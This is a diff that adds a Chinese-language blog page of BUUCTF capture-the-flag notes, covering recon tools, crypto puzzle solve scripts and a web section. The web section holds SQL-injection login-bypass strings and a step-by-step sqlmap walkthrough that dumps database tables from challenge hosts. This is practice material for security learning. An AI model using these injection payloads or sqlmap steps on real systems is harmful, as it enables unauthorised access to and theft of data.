@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="BUUCTF神秘题好多… 补补脑洞… DASBOOK [第一章][1.4.7 案例解析]BUU BURP COURSE 1 X-Real-IP:127.0.0.1 可能是检查&quot;只能在本地访问&quot;的标志之一. 注意payload一定要空两行,不然发出去什么都收不到. N1BOOK [第一章 web入门]常见的搜集 不知道为什么别人用dirsearch扫,爆的快的不行,我自己用dir">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fluorine&#39;s blog">
+<meta property="og:url" content="https://narafluorine.github.io/2025/10/02/20017_buuctf/index.html">
+<meta property="og:site_name" content="Fluorine&#39;s blog">
+<meta property="og:description" content="BUUCTF神秘题好多… 补补脑洞… DASBOOK [第一章][1.4.7 案例解析]BUU BURP COURSE 1 X-Real-IP:127.0.0.1 可能是检查&quot;只能在本地访问&quot;的标志之一. 注意payload一定要空两行,不然发出去什么都收不到. N1BOOK [第一章 web入门]常见的搜集 不知道为什么别人用dirsearch扫,爆的快的不行,我自己用dir">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-02T07:03:34.858Z">
+<meta property="article:modified_time" content="2025-10-15T03:02:37.304Z">
+<meta property="article:author" content="Fluorine Wengers">
+<meta property="article:tag" content="algorithm">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Fluorine&#39;s blog</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="Fluorine's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/QSL/">QSL</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/12/16/30018_%E5%91%BD%E9%A2%98%E7%BB%84%E6%B1%87%E6%80%BB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/09/29/10039_%E4%BA%A4%E4%BA%92%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://narafluorine.github.io/2025/10/02/20017_buuctf/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://narafluorine.github.io/2025/10/02/20017_buuctf/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://narafluorine.github.io/2025/10/02/20017_buuctf/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">DASBOOK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-1-4-7-%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90-BUU-BURP-COURSE-1"><span class="toc-number">1.1.</span> <span class="toc-text">[第一章][1.4.7 案例解析]BUU BURP COURSE 1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">N1BOOK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-web%E5%85%A5%E9%97%A8-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%90%9C%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">[第一章 web入门]常见的搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-web%E5%85%A5%E9%97%A8-%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E"><span class="toc-number">2.2.</span> <span class="toc-text">[第一章 web入门]粗心的小李</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">Real</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-XXE"><span class="toc-number">3.1.</span> <span class="toc-text">[PHP]XXE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%BE%E8%8A%AC%E5%A5%87%E5%AF%86%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">达芬奇密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.2.</span> <span class="toc-text">这是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#keyboard"><span class="toc-number">4.3.</span> <span class="toc-text">keyboard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E8%A7%85%F0%9F%90%8E"><span class="toc-number">4.4.</span> <span class="toc-text">这是什么觅🐎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-BabyRSA"><span class="toc-number">4.5.</span> <span class="toc-text">[GWCTF 2019]BabyRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#samemod"><span class="toc-number">4.6.</span> <span class="toc-text">samemod</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-easyrsa"><span class="toc-number">4.7.</span> <span class="toc-text">[BJDCTF2020]easyrsa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%AA%E9%87%8C%E6%B7%98%E6%B2%99"><span class="toc-number">4.8.</span> <span class="toc-text">浪里淘沙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B8%A1%E8%97%95%E6%A4%92%E7%9B%90%E5%91%B3"><span class="toc-number">4.9.</span> <span class="toc-text">鸡藕椒盐味</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-%E5%A4%A7%E6%95%B0%E8%AE%A1%E7%AE%97"><span class="toc-number">4.10.</span> <span class="toc-text">[WUSTCTF2020]大数计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF2018-%E8%8A%B1%E5%BC%80%E8%97%8F%E5%AE%9D%E5%9C%B0"><span class="toc-number">4.11.</span> <span class="toc-text">[AFCTF2018]花开藏宝地</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-number">5.1.</span> <span class="toc-text">常见文件头</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97"><span class="toc-number">5.2.</span> <span class="toc-text">常见SQL注入系列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-SQL%E5%A4%A7%E6%89%8B%E5%AD%90"><span class="toc-number">5.3.</span> <span class="toc-text">自动注入系列(SQL大手子)</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Fluorine Wengers</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-02T07:03:34.858Z" class="dt-published" itemprop="datePublished">2025-10-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>BUUCTF神秘题好多…<br>
+补补脑洞…</p>
+<h1>DASBOOK</h1>
+<h2 id="第一章-1-4-7-案例解析-BUU-BURP-COURSE-1">[第一章][1.4.7 案例解析]BUU BURP COURSE 1</h2>
+<p><code>X-Real-IP:127.0.0.1</code> 可能是检查&quot;只能在本地访问&quot;的标志之一.<br>
+注意payload一定要空两行,不然发出去什么都收不到.</p>
+<h1>N1BOOK</h1>
+<h2 id="第一章-web入门-常见的搜集">[第一章 web入门]常见的搜集</h2>
+<p>不知道为什么别人用dirsearch扫,爆的快的不行,我自己用dirsearch整天吃429…<br>
+<code>dirsearch -u http://your-target/ -t 10 --delay=1</code> 限速限线程版</p>
+<h2 id="第一章-web入门-粗心的小李">[第一章 web入门]粗心的小李</h2>
+<p>GitHack神秘工具发力了…<br>
+<code>python GitHack.py http://xxx.cn/.git/</code></p>
+<h1>Real</h1>
+<h2 id="PHP-XXE">[PHP]XXE</h2>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/php_xxe">ref</a>虽然但是这个题直接搜索flag就有了是怎么回事…</p>
+<h1>Crypto</h1>
+<h2 id="达芬奇密码">达芬奇密码</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">达芬奇隐藏在蒙娜丽莎中的数字列:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 </span><br><span class="line">记录在达芬奇窗台口的神秘数字串:36968853882116725547342176952286</span><br></pre></td></tr></table></figure>
+<p>这两个都是32长度,考虑置换变换.<br>
+然后有人会发现后面的序列就是斐波那契数列,然后就按照那个规律进行置换…</p>
+<p>居然是按照斐波那契数列进行解密的…</p>
+<h2 id="这是什么">这是什么</h2>
+<p>apk里面包了一段jsfuck,用js+CPH judge跑出来即可.<br>
+有的时候解析网站反而会失败,我也不知道为什么</p>
+<h2 id="keyboard">keyboard</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee</span><br></pre></td></tr></table></figure>
+<p>这些字母对应着123456789…<br>
+然后每个字母出现次数在1-4范围内,联想九键键盘…</p>
+<p>然后由于o这个值是9,对应九键键盘中 <code>WXYZ</code> 这一栏,出现三次意味着 <code>X</code> .</p>
+<h2 id="这是什么觅🐎">这是什么觅🐎</h2>
+<p>观察题…每周字母有两个,对应的密文也有两个…<br>
+那么我们初步认为是查表…<br>
+然后得到数字转字母.</p>
+<h2 id="GWCTF-2019-BabyRSA">[GWCTF 2019]BabyRSA</h2>
+<p>RSA部分白给,但是明文是按照顺序被拆分成a,b,然后给出 $a+b$ 和 $a^3+b^3$ …</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.abc <span class="keyword">import</span> a, b, c</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, d, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, d, n)</span><br><span class="line">res = solve([a + b - c1, <span class="built_in">pow</span>(a, <span class="number">3</span>) + <span class="built_in">pow</span>(b, <span class="number">3</span>) - c2], [a, b])</span><br><span class="line"></span><br><span class="line">f1 = res[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">f2 = res[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cun.long_to_bytes(f1) + cun.long_to_bytes(f2))</span><br></pre></td></tr></table></figure>
+<p>上面好像有一个能解方程的好东西…</p>
+<h2 id="samemod">samemod</h2>
+<p><code>bz2</code> 文件,据说也是一种压缩文件…</p>
+<p>共模攻击白给.<br>
+但是解出来的数字长这样:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span><br></pre></td></tr></table></figure>
+<p>应该按照位置拆分ascii码…<br>
+怪不得long to bytes解不出来…</p>
+<h2 id="BJDCTF2020-easyrsa">[BJDCTF2020]easyrsa</h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z=Fraction(<span class="number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="number">1</span>,Derivative(arth(q),q))</span><br></pre></td></tr></table></figure>
+<p>在给出e c n之后额外给出了这个…<br>
+ds说 <code>Derivative(f(b),b)</code> 是在函数内对某个东西求导.<br>
+<code>Fraction(a,b)</code> 的意思是 $\frac ab$ …</p>
+<h2 id="浪里淘沙">浪里淘沙</h2>
+<p>把获得的单词连在一起提交即可。（我这里有一串数字：4，8，11，15，16）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tonightsuccessnoticenoticewewesuccesstonightweexamplecryptoshouldwebackspacetonightbackspaceexamplelearnwesublimlearnbackspacetheshouldwelearnfoundsublimsystemexamplesublimfoundlearnshouldmorningsublimsystemuserlearnthecryptomorningexamplenoticetonightlearntonightlearntonightsublimenterusermorningfoundtonightweenterfoundnoticethecryptomorningthebackspacelearntonightlearn...</span><br></pre></td></tr></table></figure>
+<p>显然这段文字是由几个单词组成的,所以考虑提取出来.<br>
+替换…</p>
+<p>然后呢???结果居然是词频统计然后给出出现次数第几小的东西???</p>
+<h2 id="鸡藕椒盐味">鸡藕椒盐味</h2>
+<p>公司食堂最新出了一种小吃，叫鸡藕椒盐味汉堡，售价八块钱，为了促销，上面有一个验证码，输入后可以再换取一个汉堡。但是问题是每个验证码几乎都有错误,而且打印的时候倒了一下。小明买到了一个汉堡，准备还原验证码，因为一个吃不饱啊 <s>验证码如下：1100 1010 0000 ,而且打印的时候倒了一下。把答案哈希一下就可以提交了。</s> (答案为正确值(不包括数字之间的空格)的32位md5值的小写形式) 注意：得到的 flag 请包上 flag{} 提交</p>
+<p>奇偶校验位…<br>
+海明码…<br>
+reverse一下…<br>
+神人题目</p>
+<h2 id="WUSTCTF2020-大数计算">[WUSTCTF2020]大数计算</h2>
+<p>这也是个神人题目,拼好题不说还搞OSINT…</p>
+<p>宇宙终极问题：求 $x,y,z$ 满足方程 $x^{3}+y^{3}+z^{3}=42$<br>
+<a target="_blank" rel="noopener" href="https://www.theregister.com/2019/09/07/three_cubes_problem/">ref</a></p>
+<p>$$x=−80538738812075974$$<br>
+$$y=80435758145817515$$<br>
+$$z=12602123297335631$$</p>
+<h2 id="AFCTF2018-花开藏宝地">[AFCTF2018]花开藏宝地</h2>
+<p>又一道神秘题…<br>
+门限密码,神秘加密体系…<br>
+幸亏直接找脚本了,节省下不会还红温的时间…<br>
+exp(抄的):</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a1 =</span><br><span class="line">d1 =</span><br><span class="line">a2 =</span><br><span class="line">d2 =</span><br><span class="line">a3 = </span><br><span class="line">d3 =</span><br><span class="line"></span><br><span class="line">dd = d1*d2*d3</span><br><span class="line">t1 = <span class="built_in">pow</span>(dd//d1,d1-<span class="number">2</span>,d1)</span><br><span class="line"><span class="keyword">assert</span>(t1*d2*d3%d1 == <span class="number">1</span>)</span><br><span class="line">t2 = <span class="built_in">pow</span>(dd//d2,d2-<span class="number">2</span>,d2)</span><br><span class="line"><span class="keyword">assert</span>(t2*d1*d3%d2 == <span class="number">1</span>)</span><br><span class="line">t3 = <span class="built_in">pow</span>(dd//d3,d3-<span class="number">2</span>,d3)</span><br><span class="line"><span class="keyword">assert</span>(t3*d2*d1%d3 == <span class="number">1</span>)</span><br><span class="line">s = a1*t1*d2*d3+a2*t2*d1*d3+a3*t3*d1*d2</span><br><span class="line">p = </span><br><span class="line">s %= dd</span><br><span class="line"><span class="comment"># print(hex(s))</span></span><br><span class="line">s %= p</span><br><span class="line">s = <span class="built_in">hex</span>(s)[<span class="number">2</span>:]</span><br><span class="line">flag = <span class="built_in">list</span>(<span class="built_in">bytearray</span>.fromhex(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h1>Web</h1>
+<h2 id="常见文件头">常见文件头</h2>
+<p><code>Referer</code> :你从哪个网页过来<br>
+<code>User-Agent</code> :你使用哪个浏览器<br>
+<code>X-Forwarded-For</code> :你的原始ip?</p>
+<h2 id="常见SQL注入系列">常见SQL注入系列</h2>
+<p>账号:<br>
+admin’ or 1=‘1<br>
+密码:(随便填)<br>
+admin’ or 1='1</p>
+<p>SQL转义???(好像转成web题了)<br>
+username=&amp;password=or 1='1</p>
+<h2 id="自动注入系列-SQL大手子">自动注入系列(SQL大手子)</h2>
+<p>找注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1</span><br></pre></td></tr></table></figure>
+<p>找所有数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1 --dbs</span><br></pre></td></tr></table></figure>
+<p>回显:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] note</span><br><span class="line">[*] performance_schema</span><br></pre></td></tr></table></figure>
+<p>找某个数据库中的表名(下面是note)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1 -D note -tables</span><br></pre></td></tr></table></figure>
+<p>回显:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: note</span><br><span class="line">[2 tables]</span><br><span class="line">+-------+</span><br><span class="line">| fl4g  |</span><br><span class="line">| notes |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure>
+<p>找这个列表下的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1 -D note -T fl4g --columns</span><br></pre></td></tr></table></figure>
+<p>回显:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: note</span><br><span class="line">Table: fl4g</span><br><span class="line">[1 column]</span><br><span class="line">+---------+-------------+</span><br><span class="line">| Column  | Type        |</span><br><span class="line">+---------+-------------+</span><br><span class="line">| fllllag | varchar(40) |</span><br><span class="line">+---------+-------------+</span><br></pre></td></tr></table></figure>
+<p>查看这个东西的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://18a64bdf-b7b2-44a9-8935-83536c6010e4.node4.buuoj.cn:81/index.php?id=1 -D note -T fl4g -C fllllag --dump</span><br></pre></td></tr></table></figure>
+<p>回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: note</span><br><span class="line">Table: fl4g</span><br><span class="line">[1 entry]</span><br><span class="line">+---------------------------------+</span><br><span class="line">| fllllag                         |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| n1book&#123;union_select_is_so_cool&#125; |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure>
+<p>查看当前数据库名???</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://fc37e90a-e533-4b4a-a8bd-7d02eab1fcb1.node5.buuoj.cn:81/backend/content_detail.php?id=1 --current-db</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/friends/">友链</a></li>
+        
+          <li><a href="/QSL/">QSL</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">DASBOOK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-1-4-7-%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90-BUU-BURP-COURSE-1"><span class="toc-number">1.1.</span> <span class="toc-text">[第一章][1.4.7 案例解析]BUU BURP COURSE 1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">N1BOOK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-web%E5%85%A5%E9%97%A8-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%90%9C%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">[第一章 web入门]常见的搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-web%E5%85%A5%E9%97%A8-%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E"><span class="toc-number">2.2.</span> <span class="toc-text">[第一章 web入门]粗心的小李</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">Real</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-XXE"><span class="toc-number">3.1.</span> <span class="toc-text">[PHP]XXE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%BE%E8%8A%AC%E5%A5%87%E5%AF%86%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">达芬奇密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 